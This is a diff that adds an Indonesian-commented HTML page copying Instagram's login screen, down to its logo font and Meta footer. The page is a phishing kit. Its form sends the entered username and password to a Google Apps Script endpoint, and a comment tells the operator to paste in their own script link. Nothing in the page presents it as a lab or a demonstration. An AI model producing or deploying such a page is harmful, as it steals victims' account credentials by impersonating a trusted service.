@@ -1,1 +1,88 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <!-- Tambahkan link ke font Lobster -->
+  <link href="https://fonts.googleapis.com/css2?family=Lobster&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+    body {
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-container {
+      width: 100%;
+      max-width: 350px;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px 40px 20px;
+      text-align: center;
+    }
+    .login-container h1 {
+      font-family: 'Lobster', cursive;
+      font-size: 40px;
+      margin-bottom: 30px;
+      font-weight : normal ;
+    }
+    .login-container input {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+    .login-container button {
+      width: 100%;
+      padding: 10px;
+      background-color: #3897f0;
+      border: none;
+      color: white;
+      font-weight: normal;
+      border-radius: 4px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    .forgot {
+      margin-top: 12px;
+      font-size: 12px;
+    }
+    .meta-footer {
+      margin-top: 40px;
+      font-size: 11px;
+      color: #999;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h1>Instagram</h1>
 
+    <!-- GANTI LINK INI dengan link Google Script kamu -->
+    <form method="POST" action="https://script.google.com/macros/s/PASTE_LINK_KAMU/exec">
+      <input type="text" name="username" placeholder="Phone number, username, or email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+
+    <div class="forgot">
+      <a href="#">Forgot password?</a>
+    </div>
+
+    <div class="meta-footer">
+      © 2025 Instagram from Meta · Tentang · Blog · Pekerjaan · Bantuan · API · Privasi · Ketentuan · Lokasi · Instagram Lite · Thread · Verifikasi Meta · Meta di Indonesia
+    </div>
+  </div>
+</body>
+</html>
